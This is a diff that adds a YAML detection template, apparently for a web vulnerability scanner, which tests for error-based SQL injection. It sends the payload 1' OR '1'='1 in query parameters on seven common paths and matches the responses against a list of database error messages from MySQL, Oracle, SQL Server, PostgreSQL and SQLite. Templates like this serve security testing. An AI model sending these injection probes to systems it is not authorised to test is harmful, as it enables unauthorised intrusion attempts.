@@ -1,0 +1,31 @@
+name: poc-yaml-sql-injection-error-based
+
+description: "Error-based SQL Injection"
+method: GET
+alwaysExecute: true
+path:
+  - "/?id=1' OR '1'='1"
+  - "/user/?id=1' OR '1'='1"
+  - "/product/?id=1' OR '1'='1"
+  - "/search/?query=1' OR '1'='1"
+  - "/api/item/?id=1' OR '1'='1"
+  - "/details/?product_id=1' OR '1'='1"
+  - "/view/?doc_id=1' OR '1'='1"
+expression:
+  status: 200
+  body_any:
+    - "You have an error in your SQL syntax"
+    - "mysql_fetch_array()"
+    - "execute query"
+    - "Invalid SQL syntax"
+    - "ORA-01756: quoted string not properly terminated"
+    - "Query failed: ERROR: unterminated quoted string"
+    - "Microsoft OLE DB Provider for SQL Server"
+    - "Unclosed quotation mark after the character string"
+    - "SQL command not properly ended"
+    - "PostgreSQL query failed: ERROR: unterminated quoted string"
+    - "Warning: pg_query(): Query failed:"
+    - "JDBC SQLException"
+    - "Unexpected end of command in statement"
+    - "SQLiteException"
+    - "System.Data.SqlClient.SqlException"
